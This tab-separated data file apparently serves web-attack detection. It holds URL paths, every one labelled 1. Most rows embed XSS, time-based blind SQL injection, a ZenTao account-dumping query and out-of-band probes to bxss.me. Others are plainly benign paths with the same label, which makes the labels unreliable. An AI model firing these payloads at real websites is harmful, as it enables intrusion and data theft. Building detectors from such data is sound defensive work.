sentences	labels
en/**************/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
xwzx/****/202009/t20200915_253522.html' and 'x'='y 	 1
icons/**********/index.php?limit="><script>alert(777);</script>&page=1"><script>alert(777);</script>&rt=product/special"><script>alert(777);</script>&sort="><script>alert(777);</script> 	 1
en/********/' and 'x'='x 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(748)</script>?_=1630311573652 	 1
xxgk/******/2008/list.html?new=bxss.me 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/******/tjj/zfxxgkml_2127/jgzn_2042/list.html 	 1
jsearchfront/**********/autocomplete.do?begin=&end=&eq=&oq=&p=1&pg=1&pos=if(now()=sysdate(),sleep(15),0)&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=1&tpl=16&websiteid=110105008056111 	 1
qhly/******/2017/03/02/javascript:window.print() 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(331)</script>?_=1630311364687 	 1
images/************/index?search="">alert(/777/) 	 1
ru/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 1
index.php/***/javascript: 	 1
n42684'||'/*******/n236776/c1649498/content.html 	 1
jsearchfront/********/jcse/110105008056111/16/images'""()&%<acx><script >5il4(9956)</script>/catesearchbtn.js 	 1
xxgk/*****/1088/bxss.me/t/xss.html? 	 1
art/****/8/25/art_46_238394.html/""><script>alert(6648)</script> 	 1
vc/**/lib/http://bxss.me/t/xss.html? 	 1
lz/******/count/0006000/000000000000/window.location.href 	 1
xxgk/******/http://bxss.me/t/fit.txt?.jpg/list.html 	 1
qhsw/******/2021/04/22/013373702.shtml/<img src="javascript:alert(303)"> 	 1
newscenter/******/2011/12/10/javascript:dozoom(14) 	 1
lcgg1/********/javascript:void(0); 	 1
news/********/yidaiyilushipin?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),6)--  	 1
swld/******/2021/07/10/javascript:window.print() 	 1
ywzzq/***/sources?resource=alert(/777/)&format=txt 	 1
xwzx//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
kpzx/****/20150902/1753735.html 	 1
css/********/loggedout.jsp?locale=""><script>alert(777)</script> 	 1
pic/*/10/97/27/10972771_037279.jpg 	 1
zwgk/****/202103/encodeuricomponent(window.location.href) 	 1
en/************/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
gjcp/*****/index.php?o=panel&a=receiver.edit&id=alert(777) 	 1
xwdt/****/jzgl/gzdt' and 2*3*8=6*8 and 'o3qz'='o3qz/1.htm 	 1
ldzc/*****/201610/bxss.me/t/xss.html? 	 1
shzr/*******/diary/new/submit.php 	 1
gjcp/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
xwzx/****/2020_tzgg/202009/t20200929_254154.html' and 'x'='y 	 1
xq/******/2021/01/21/javascript:void(0); 	 1
templates/********/index.aspx?nodeid=394') and 2102=(select 2102 from pg_sleep(5)) and ('jjjn'='jjjn 	 1
css/data:image/svg xml;charset=utf-8,<svg viewbox='0 0 120 120' xmlns='http://**********/2000/svg' xmlns:xlink='http://**********/1999/xlink'><defs><line id='l' x1='60' x2='60' y1='7' y2='27' stroke='#fff' stroke-width='11' stroke-linecap='round'/></defs><g><use xlink:href='#l' opacity='.27'/><use xlink:href='#l' opacity='.27' transform='rotate(30 60,60 	 1
'""()&%<acx><script >9hvh(9163)</script>/210909-2/*****/d00139fee967b9a5c83cbe1cd7e911f8.css 	 1
xxgk/******/rsrm/list.html?new='.gethostbyname(lc('hitmd'.'rwwfofvx360d1.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(120).chr(79).chr(98).chr(78).' 	 1
xxpl/********/javascript:void(0); 	 1
xq/******/2021/10/08/012205616.shtml 	 1
ywly/****/jtysgc/ 	 1
wla/*********/comul_total.json.jsp?callback=jquery171030196352313975305_1632325579271%') and 0153=0153 and '%'=' 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(6249)</script>?_=1630312269447 	 1
nul/******/common/newaccount.aspx?btncancel=alert(777) 	 1
newscenter/******/2021/12/16/javascript:window.close(); 	 1
xxgk/****/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) 	 1
socket.gethostbyname(""hitia"" ""oticbxee5fa44.bxss.me."")[3].to_s) ""/*****/sz/202108/t20210806_185416.html 	 1
cgi-bin/*******/gvideos.php?gid=1 and 1=2 	 1
ztsj/**/gwydscddc/ 	 1
xwdt/****/zjdt/gzdt'||'/145.htm 	 1
index/******/2019/09/23/javascript:void(0); 	 1
zwgk/****/bmyjs/zzqdwgzbmyxsjg/zzqdwxsb/\"javascript:void(0)\" 	 1
socket.gethostbyname(""hitgx"" ""edjswaxy7c0fe.bxss.me."")[3].to_s) ""/*******/jquery.panel.js 	 1
vc/**/lib/easyui'""()&%<acx><script >smws(9514)</script>/plugins/jquery.panel.js 	 1
cpsms/********/javascript:void(0); 	 1
nbfw/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 1
xxgk/******/tjj/zfxxgkzn_2123/list.html?new=bxss.me/t/xss.html? 	 1
ztpd/******/2021/07/11/javascript:void(0); 	 1
qhly/******/2021/11/26/javascript:dozoom(9) 	 1
jsearchfront/********/jcse/110105008056111/16/images/plugin/http://bxss.me/t/fit.txt?.jpg/pinterest_grid.js 	 1
was5/***/search?channelid=222832' waitfor delay '0:0:2&searchword= 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(3745)</script>?_=1630312045395 	 1
socket.gethostbyname(""hitex"" ""ubrrtffof52e8.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/catesearchbtn.js 	 1
module/*****/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/jquery.ad-gallery2.css 	 1
xxgk/***/sa3/addholiday.do 	 1
xq/******/common/signin.aspx?tbpassword=alert(777)returnurl=/******/common/default.aspx 	 1
module/**********/visit.jsp?i_columnid=1&i_webid=1&type[0]=exp&type[1]==1'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1148786254')))>'0 	 1
0'xor(if(now()=sysdate(),sleep(15),0))xor'z/*/jquery.ellipsis.js 	 1
qhly/******/2021/10/02/javascript:dozoom(14) 	 1
2016zt/******/2017/07/27/javascript:window.print() 	 1
xwzx/****/2021_mtgz/if(now()=sysdate(),sleep(15),0)/t20210505_273338.html 	 1
en/********/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
zwgk'||'/******/gytdsdfwzs/wzs/zcwj.htm 	 1
system/*****/sysloginuser.aspx?login=error&error=</script><script>alert(document.domain)</script> 	 1
was5/***/search?channelid=253477&keyword=the&orderby=-docreltime&outlinepage=10&page=2&perpage=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&searchword=the 	 1
ddjs/****/202009/t20200915_253538.html and 1=1 	 1
dcwj//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
was5/***/search?channelid=222832&outlinepage=10; waitfor delay '0:0:2&page=4172&perpage=20 	 1
z/******/http://bxss.me/t/xss.html? 	 1
zwxx_11337/****/202002/t20200217_1957315.html 	 1
ywzzq/*************/ajax_managed_services.php 	 1
module/********/downfile.jsp?classid=0&filename=5304f109c5a94f8296864a137b39f53b.xls and 9540=9540-- uudm 	 1
news/********/redianguanzhu?page=1 and 7967=7967-- 	 1
ztzl/******/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 1
xwzx/****/tz17_6387/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
newscenter/******/2021/11/12/javascript:void(0); 	 1
lccp/********/javascript:void(0); 	 1
socket.gethostbyname('hityf' 'nnjcfbmaac3d3.bxss.me.')[3].to_s) '/****/list.html 	 1
fzgn/****/?wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 1
xwdt/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/1.htm 	 1
system/********/code/news/click/dynclicks.jsp?clickid="and/**/extractvalue(1,concat(char(126),md5(1408548624)))and" 	 1
xwzx/****/sswj/201907/w020190708432831719915.jpg 	 1
index/******/2021/11/20/javascript:window.print() 	 1
news/********/jishuchuangxin?page=1') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)--  	 1
video//*******/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)> 	 1
zwgk/****/bmyjs/zzqzfzcbmyzstsjg/zzqsthjt/zzqhbt/\"javascript:void(0)\" 	 1
public/****/myspace/student.php?keyword=31337"" onmouseover=confirm(777)//&active=0&_qf__search_user=&submit=search 	 1
zfld/******/2021/08/19/javascript:window.close(); 	 1
z/*******/gvideos.php?gid=1 and 1=1 	 1
jsearchfront/********/jcse'""()&%<acx><script >vpin(9097)</script>/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 1
nul/*********/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir="/><script>alert(777)</script> 	 1
xwzx/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/2021_mtgz/******/t20210505_273338.html 	 1
zzsl' and 2*3*8=6*8 and 'nzsf'='nzsf/******/ 	 1
xwzx/'""()&%<acx><script >ysri(9295)</script>/****/201812/t20181208_112298.html 	 1
zmhd/*****/hfswsj/http://bxss.me/t/xss.html? 	 1
pic/*/00/69/92/699256_953194.jpg 	 1
2016zt/******/2016/11/07/javascript:void(); 	 1
cgi-bin/******/cgi-bin/setup.cgi 	 1
swld/******/2021/11/05/javascript:window.print() 	 1
z/210909-2/*****/http://bxss.me/t/xss.html? 	 1
2016zt/******/2017/07/15/javascript:void(0); 	 1
qhly/******/2012/10/12/javascript:window.print() 	 1
hdjl/****/202012/http://bxss.me/t/xss.html? 	 1
ztzl/******/djbn_jthd//*/-->'""></iframe></script></style></title></textarea><script >alert(57093)</script> 	 1
xwzx/****/sgaj/201812/http://bxss.me/t/xss.html? 	 1
swwj/******/2021/08/25/javascript:void(0); 	 1
inc/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
n42812/******/n42825'||'/n1588869/c1589249/content.html 	 1
public/*******/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
microstrategy7/login.asp?server=server001&project=project001&port=0&uid=uid001&msg="><script>alert(/***************************/);</script>< 	 1
newscenter/******/2020/11/24/javascript:window.close(); 	 1
template//***/wwa060gx/xhr_send?t=1629430557460 	 1
com1/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 1
live/*/432935.html 	 1
jsearchfront/********/jcse/110105008056111/16/'""()&%<acx><script >srzj(9202)</script>/searchbtn.js 	 1
zwgk/******/'""()&%<acx><script >ymrc(9547)</script>/qtfdxx/ 	 1
vc/**/http://bxss.me/t/fit.txt/easyui/plugins/jquery.panel.js 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(1100)</script>?_=1630311739724 	 1
web/********/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_182828d646ce6b684e7501e7a8ebacf5/><!--<textarea> 	 1
jsearchfront/********/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/css.js 	 1
was5/***/search?channelid=299868') and 9981=5853 and '1'='1&perpage=1000 	 1
ztzl/*********/xxhd/201412/javascript:window.external.addfavorite(document.location.href,document.title) 	 1
jsearchfront/********/jcse/110105008056111<esi:include src=""http://bxss.me/rpb.png""/>/16/images/plugin/waterpull/pinterest_grid.js 	 1
vc/**/widgets/hanweb/placeholder/placeholder' and 2*3*8=6*8 and 'zwqx'='zwqx.js 	 1
pic/*/10/01/23/10012398_666464.jpg 	 1
socket.gethostbyname(""hitzp"" ""psnxbltt2ffa1.bxss.me."")[3].to_s) ""/*****/grouppic/jquery.ad-gallery.js 	 1
module/********/downfile.jsp?classid=0""xor(if(now()=sysdate(),sleep(15),0))xor""z&filename=a0efc095dee8420b9552bc6c34805356.xls 	 1
xwdt/****/csjs/gzdt/17.htm 	 1
xxgk/******/tjj/"".gethostbyname(lc(""hitxv"".""hhtzqsif0d8f8.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(112).chr(78).chr(117).chr(71).""_2127/jytabljg_2061/list.html 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*****/urite/urite.min.js 	 1
hdjl//***********/202103/t20210303_2614145.html 	 1
qhly/******/2007/08/08/javascript:window.print() 	 1
xinanyanjiu' and 2*3*8=6*8 and '6tbw'='6tbw/****************/index_2.html 	 1
/***********/5/hanweb.css 	 1
outurl/******/news/show/title/time-for-a-heavy-harvest-new-release/src/"><script>alert(777)</script>@random4cd201e063d5c 	 1
vc/**/widgets/hanweb/placeholder/if(now()=sysdate(),sleep(15),0).js 	 1
col/******/if(now()=sysdate(),sleep(15),0).html 	 1
prn/***/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(777)</script> 	 1
nul/*************/ajax_managed_services.php 	 1
2016zt/******/2017/07/26/javascript:window.close(); 	 1
js/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 1
module/**********/visit.jsp/<img src="javascript:alert(2034)">?type=3&i_webid=1&i_columnid=5264&i_articleid=221965 	 1
gygj/*********/plugins/handwrite/index.php?id="">alert(777) 	 1
jsearchfront/categorysearch.do?cateid=1&eq=1&oq=bxss.me/*/xss.html? 	 1
was5/***/search?channelid=234439&orderby=relevance&perpage=24&searchword=1') and 1869=1869  	 1
z/210909-2/*****/3494307764'""()&%<acx><script >k7df(9901)</script>.js 	 1
newscenter/******/2020/11/27/javascript:window.print() 	 1
index/******/2019/06/06/javascript:void(); 	 1
was5/***/search?page=2&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15%' or 8485=8485 and '%'='&outlinepage=10 	 1
index/******/2021/11/22/javascript:window.print() 	 1
if(now()=sysdate(),sleep(12),0)/********/js/news/newscontent.js 	 1
xxgk/******/tjj/zfxxgkml_http://bxss.me/t/fit.txt/hygq_2064/list.html 	 1
xwzx/http://*******/t/fit.txt?.jpg/ 	 1
xxgk/*******/xxgkzn/list.html?new='.gethostbyname(lc('hitoa'.'tgmbremu260cf.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(102).chr(80).chr(106).chr(82).' 	 1
ywly/*****/index.html?continent=%') or 7000=7000 /* 	 1
con/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
system/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/**/newcalendar/config.js 	 1
was5/***/search?channelid=299868' or 6025=6025 /*&perpage=1000 	 1
synr/******/common/signin.aspx?cbautosignin=""alert(777) 	 1
ldzc/****/201907/t20190702_139172.html?leader='.gethostbyname(lc('hitkg'.'hrueyejja7a92.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(121).chr(83).chr(119).chr(88).' 	 1
xxpl/********/javascript:void(0); 	 1
rlzy//***/8wqbt66u/xhr_send?t=1632398746026 	 1
skin/**/encrypt' and 2*3*8=6*8 and 'iuwk'='iuwk/jbase64.js 	 1
zfld/******/2021/09/15/javascript:window.print() 	 1
swld/******/2021/10/01/javascript:window.print() 	 1
2012zt/****/jb/? 	 1
en/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
lcgg/********/javascript:void(0); 	 1
en/******/common/signin.aspx?btnsignin=alert(777)returnurl=/******/common/default.aspx 	 1
zwgk/zdlygk'||'/********/wzs/ltq/xmb_gzdxb.htm 	 1
com1/*********/wp-content/plugins/securimage-wp/siwp_test.php/""/>alert(777);?tested=1 	 1
article/******/201907150955141023.html 	 1
_dwr%' and 2*3*8=6*8 and 'afyi'!='afyi%/*********/newsvotedwr.js 	 1
qtyz/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
dcwj/cgi-bin/******/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> 	 1
was5/***/search?channelid=299868') or 7632=7632 and '1'='1&perpage=1000 	 1
qywh/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
ldzc/*****/201611/t20161121_76519.html?leader='""()&%<acx><script >f9n3(9682)</script> 	 1
images/**********/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280 	 1
socket.gethostbyname(""hitin"" ""apibpijvd2664.bxss.me."")[3].to_s) ""/**/art_32_237912.html 	 1
nul/********/index.jsp?locale=""><script>alert(777)</script> 	 1
was5/***/search?page=2%' or 1060=5967 and '%%'='%&channelid=253477&searchword=1&keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 	 1
index/******/2020/09/16/javascript:window.close(); 	 1
module/***/jpage/theme/default/css/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.css 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/****/202103/t20210303_2614145.html 	 1
xxgk/******/tjj/'""()&%<acx><script >uocq(9645)</script>_2127/jgzn_2042/list.html 	 1
2016zt/******/2018/08/23/javascript:void(0); 	 1
ddjs/****/202108/ 	 1
gjcp/****/ and 1>1 	 1
module'||'/*****/grouppic/jquery.ad-gallery2.css 	 1
ywly/**********/workbox.php?mode=addtolightbox&mediaid=""><script>alert(777)</script> 	 1
module/**********/visit.jsp?i_articleid=5195&i_columnid[0]==2and 3 in &i_columnid[1]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1289980600')))&i_webid=1&type=3 	 1
module/*****/ckplayer/ckplayer.js/""><script>alert(645)</script>?_=1630311538664 	 1
template/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
jsearchfront/********/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/condition.js 	 1
z/*****/index/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
dss/***/_log/error_log 	 1
xxgk/******/bxss.me/list.html 	 1
shzr/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
xxgk/******/zfczyjs/list.html?new=0.6182148547908533&wvstest=javascript:domxssexecutionsink(1,""'/""><xsstag>()locxss"") 	 1
/***********/zzxxgk/tjj/ 	 1
xxgk/*******/ybjsqzn/'""()&%<acx><script >r8on(9322)</script>.html 	 1
licaijzgg/********/javascript:void(0); 	 1
newscenter/******/2021/11/10/javascript:void(0); 	 1
cpsms/********/javascript:void(0); 	 1
cgi-bin/**********/tabledata.jsp?server=localhost&db=mysql&table=""/>alert(777); 	 1
xxgk/*****/1088/http://bxss.me/t/xss.html? 	 1
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/********/js/vsb_news_search_entry.js 	 1
js/****/messages/outbox.php?f=social"" onmouseover=""confirm(777) 	 1
jsearchfront/******/mainframe.do?begin=20201023&end=20211023&eq=1&oq=if(now()=sysdate(),sleep(15),0)&p=1&pg=1&pos=filenumber&pq=&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111 	 1
lz/******/2021/10/21/javascript:void(0); 	 1
newscenter/******/2021/01/06/javascript:void(); 	 1
es/*******/moteur-prix.php?categoriemoteur=1"">alert(777); 	 1
images/*/0'xor(if(now()=sysdate(),sleep(15),0))xor'z.js 	 1
inc/*********/jsp/ccmr/clientportal/login.jsp?strmessage=<img src=/ onerror="alert(777)"/> 	 1
xwdt/****/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/zcwj/1.htm 	 1
2017zt/******/2018/02/06/javascript:window.close(); 	 1
2021zt/******/2021/03/13/javascript:window.print() 	 1
inc/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
pic/*/10/28/10/10281001_688737.jpg 	 1
public/wp-admin/admin.php?page=thecartpress/*****/addressedit.php&address_id='"><script>alert(77729;</script> 	 1
nbfw/****/prototype/1/session/check/something<img src=a onerror=alert(777)> 	 1
synr/*****/edit.php?menu="">pt>alert(777); script>pt> 	 1
module/**********/visit.jsp?i_articleid=242356&i_columnid=if(now()=sysdate(),sleep(15),0)&i_webid=1&type=3 	 1
jsearchfront/********/jcse/110105008056111/16<esi:include src=""http://bxss.me/rpb.png""/>/images/view.js 	 1
newscenter/******/2021/12/19/javascript:window.print() 	 1
2017zt/******/2017/11/28/javascript:void(0); 	 1
swld/******/2021/04/17/javascript:window.close(); 	 1
xxgk/******/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
xxgk/*******/http://bxss.me/t/xss.html? 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/*/jquery.ellipsis.js 	 1
icons/******/common/newaccount.aspx?btncancel=alert(777) 	 1
if(now()=sysdate(),sleep(12),0)/******/ywdt/10.htm 	 1
kefuzhongxin/common-problem/****/2017-0'xor(if(now()=sysdate(),sleep(22),0))xor'z-15/405.html 	 1
pic/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 1
skin%' and 2*3*8=6*8 and 'bcuc'!='bcuc%/**/encrypt/jbase64.js 	 1
ddjs/****/202011/t20201126_259396.html' and 'x'='y 	 1
if(now()=sysdate(),sleep(15),0)/****/jcgc/ 	 1
cpsms/********/javascript:void(0); 	 1
vc"" and 2*3*8=6*8 and ""hisy""=""hisy/**/lib/easyui/themes/bootstrap/linkbutton.css 	 1
igi/****/opengovmsgbox.do?appid=4&method=listgovmsgboxs&pagesize=5&siteid=115<esi:include src=""http://bxss.me/rpb.png""/> 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(1010)</script>?_=1630311687607 	 1
prn/****/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
shzr/*****/edit.php?title="">pt>alert(777);< /script>pt> 	 1
xxgk/******/"".gethostbyname(lc(""hitjs"".""olkrdhoe47415.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(113).chr(81).chr(110).chr(74).""/zfxxgkml_2127/jgzn_2042/list.html 	 1
vc/ui'||'/******/page.js 	 1
jsearchfront/template'||'/****/110105008056111/16/images/jquery.cookie.js 	 1
'""()&%<acx><script >jl8q(9585)</script>/**/lib/easyui/plugins/jquery.linkbutton.js 	 1
newscenter/******/2021/06/03/javascript:void(0); 	 1
web/********/fonts/fontawesome-webfont.ttf?v=4.3.0</textarea>--><xss_117591c92de8950a0e3021ce67a6b70f/><!--<textarea> 	 1
xxgk/*****/1079/1080/list.html?new="".gethostbyname(lc(""hitnl"".""whfitphb43aea.bxss.me."")).""a"".chr(67).chr(hex(""58"")).chr(116).chr(73).chr(112).chr(67)."" 	 1
2016zt/******/2016/04/11/javascript:window.close(); 	 1
jsearchfront/********/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/view.js 	 1
module/***/jpage/theme' and 2*3*8=6*8 and 'sid0'='sid0/simple/css/jpage.css 	 1
zwgk/****/bmyjs/qtdw/zzqhtglzx/\"javascript:void(0)\" 	 1
socket.gethostbyname(""hittm"" ""roznikxp89cf8.bxss.me."")[3].to_s) ""/*****/201610/t20161016_531.html 	 1
art/*******/7/12/art_35_234319.html 	 1
art/****/10/11/art"" and 2*3*8=6*8 and ""frrj""=""frrj_34_242319.html 	 1
system/********/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/centercutimg.js 	 1
was5/******/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 	 1
nul/***/alert(777) 	 1
jsearchfront/********/jcse/bxss.me/16/images/main.css 	 1
template/*****/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 1
outurl/****/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
index/*****/detail/art_id'||'/239.html 	 1
lz/******/identity-mgt/challenges-mgt.jsp?addrowid=xss&setname=""/>alert(777) 	 1
xinanyanjiu/*************/caiwuyaowen/2020-08-07/10166.html 	 1
index/******/2021/12/01/javascript:void(); 	 1
module/'""()&%<acx><script >evhi(9657)</script>/*****/theme/default/css/jpage.css 	 1
zwgk/****/bmyjs/zzqzx/zzqzxbgt/\"javascript:void(0)\" 	 1
newscenter/******/2012/02/02/javascript:dozoom(14) 	 1
art/****/10/12/art'||'_31_242356.html 	 1
images//***********/xys.css 	 1
ldzc/*****/202007/t20200701_168748.html?leader=–Ï°°∑Â<esi:include src=""http://bxss.me/rpb.png""/> 	 1
jsearchfront/*******/jcse/110105008056111/16/images/main.css 	 1
index/index' and 2*3*8=6*8 and 'tlrg'='tlrg/******/art_id/239.html 	 1
kefuzhongxin/common-problem'||'/****/2017-02-15/406.html 	 1
ztzl/****/qyddt/202005/t20200527_247881.html' and 'x'='x 	 1
module/*****/ckplayer/ckplayer.js/<img src="javascript:alert(4792)">?_=1630312164522 	 1
0""xor(if(now()=sysdate(),sleep(15),0))xor""z/***/main.css 	 1
pic/*/11/00/43/11004354_507055.jpg 	 1
news/********/guowaishichangzhunru?page=*/-->'""></iframe></script></style></title></textarea><script >alert(32704)</script> 	 1
col/*****/index.html/<img src="javascript:alert(681)"> 	 1
cysd/******/2017/08/03/012375318.shtml 	 1
js/******/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php 	 1
was5/*******/gvideos.php?gid=1 and 1=1 	 1
xwdt/****/jsgcxfjg/gzdt'||'.htm 	 1
zwgk/******/ncwywfgz/zws/hyx'||'/xmb_gzdxb.htm 	 1
index/******/2019/10/28/javascript:window.close(); 	 1
n42742/n42748'||'/********/content.html 	 1
qtyz/cgi-bin/******/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> 	 1
system/********/interview/room.jsp?wbinterviewid=1033&owner=1707212448%' or 8168=7196 and '%%'='% 	 1
0'xor(if(now()=sysdate(),sleep(12),0))xor'z/******/bzxajgc/gys/jyx.htm 	 1
was5/***/search?channelid=222832; waitfor delay '0:0:2&searchword= 	 1
n42684/*******/n236776'||'/c1649498/content.html 	 1
ldzc/*****/201610/t20161016_542.html?leader='""()&%<acx><script >x0cu(9289)</script> 	 1
system/********/js'||'/gotopage.js 	 1
kjcx/****/ and 1=1 	 1
vc/**/widgets/hanweb/validity/css"" and 2*3*8=6*8 and ""tqiu""=""tqiu/validity.css 	 1
system/resource' and 2*3*8=6*8 and 'wtzd'='wtzd/**/vsb_news_search.js 	 1
z/****/admin/configure_extensions.php?display=</script><script>confirm(777)</script> 	 1
module/**********/visit.jsp?i_articleid[0]==2and 3 in &i_articleid[1]=extractvalue(1,concat(char(126),md5(1121657788)))&i_columnid=15&i_webid=1&type=3 	 1
xxgk/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/zfxxgkml_2127/jytabljg_2061/list.html 	 1
jsearchfront/**********/autocomplete.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=1&pos=filenumber&pq=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111 	 1
module/*****/ckplayer/ckplayer.js/"><script>alert(4987)</script>?_=1630312235646 	 1
was5/***/search?iptsword=*/-->'""></iframe></script></style></title></textarea><script >alert(05096)</script> 	 1
news/********/siluzhibo?page=1'""()&%<acx><script >4gsn(9067)</script> 	 1
zwgk/*****/5620/5639/index.html 	 1
2021zt/****/jh/<img src="javascript:alert(276)"> 	 1
